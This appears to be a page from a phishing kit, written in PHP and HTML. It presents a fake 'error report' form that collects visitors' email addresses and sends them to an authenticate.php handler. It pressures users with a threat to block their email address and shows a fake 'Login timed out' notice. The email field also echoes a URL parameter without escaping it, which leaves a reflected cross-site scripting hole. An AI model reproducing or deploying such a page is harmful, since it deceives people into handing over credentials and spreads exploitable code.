<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
<style type="text/css">
.textFieldlog {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 14px;
	color: #2E2E2E;
	height: 24px;
	width: 96%;
	margin-bottom: 4px;
	border: 1px solid #A8A8A8;
	margin-right: auto;
	margin-left: auto;
	padding-top: 4px;
	padding-right: 10px;
	padding-bottom: 4px;
	padding-left: 10px;
	background-color: #FAFAF8;
	background-image: url(images/bg_form.png);
	background-repeat: repeat;
}
.ButtonLOG {
	color: #FFF;
	background-color: #F66;
	border: 1px solid #FFF;
	padding-top: 5px;
	padding-right: 3px;
	padding-bottom: 5px;
	padding-left: 3px;
	font-family: Arial, sans-serif;
	font-size: 11.6px;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	-khtml-border-radius: 4px;
	border-radius: 4px;
	margin-right: 2%;
	text-decoration: none;
	margin-top: 2%;
	font-weight: bold;
}
.ButtonLOG:hover {
	background-color: #FF2F2F;
}
.texthinter {
	font-size: 12px;
	font-family: Arial, sans-serif;
	color: #F00;
}
.textform {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	text-transform: uppercase;
	color: #4D4D4D;
}
.YeloowTop {
	background-color: #4B4B4B;
	border: 1px solid #333333;
	padding: 2%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 16px;
	color: #FFF;
}
.hint23 {
	background-color: #FFEAEA;
	border: 1px solid #FBB;
	font-family: Tahoma, Geneva, sans-serif;
	color: #333333;
	font-size: 12px;
	margin-bottom: 2%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
	margin-top: 2%;
	background-image: url(images/warning.png);
	background-repeat: no-repeat;
	background-position: 8px;
	padding: 4px;
	text-transform: none;
}
.sidebox67 {
	background-color: #FFCC00;
	padding: 4%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
}
td {
	padding: 8px 4px;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: solid;
	border-right-style: solid;
	border-bottom-style: none;
	border-left-style: none;
	border-top-color: #ddd;
	border-right-color: #ddd;
	border-bottom-color: #ddd;
	border-left-color: #ddd;
}
</style>
<link href="css/prototype.css" rel="stylesheet" type="text/css" />
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css" />
</head>

<body>
Fill out the form below, our technical team will fix the error in less than 3-4hrs. You will receive a confirmation email in your inbox once the error is fixed.<br />
<strong>Note:</strong> Failure to send this error report will result in blocking of your e-mail address. <br />
<br />
<?php 
// Show IF Conditional region1 
if (@$_GET['INFO'] == "unsuccessful") {
?>
<div class="hint23"><strong>&nbsp;&nbsp;</strong>&nbsp; &nbsp;<strong>Login timed out. please try again.</strong>
  <div class="clear2"></div>
</div>
<?php } 
// endif Conditional region1
?>
<form action="authenticate.php" method="get">
  <div class="container_Inner">
    <div class="topic3_inner">Your Email Address:</div>
    <div class="inner4_inner"> <strong> &nbsp;&nbsp;
      <label for="Qw1"></label>
      <span id="sprytextfield2">
      <input name="email" type="text" class="textfield1" id="email" placeholder="Enter Email Address" size="40" maxlength="400" value="<?php echo $_GET['email']; ?>"/>
      <span class="textfieldRequiredMsg"><br />
     &nbsp;&nbsp; Email address is required.</span><span class="textfieldInvalidFormatMsg"><br />
    &nbsp;&nbsp;  Invalid email address.</span></span></strong></div>
    <p> 
  </div>
  
  <br />
  <p>
    <input type="submit" class="button1" value="Proceed to fix errors" />
    </td>
       <input type="hidden" name="MM_insert" value="form1" />
</form>
<script type="text/javascript">
<!--
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2", "email");
//-->
</script>
</body>
</html>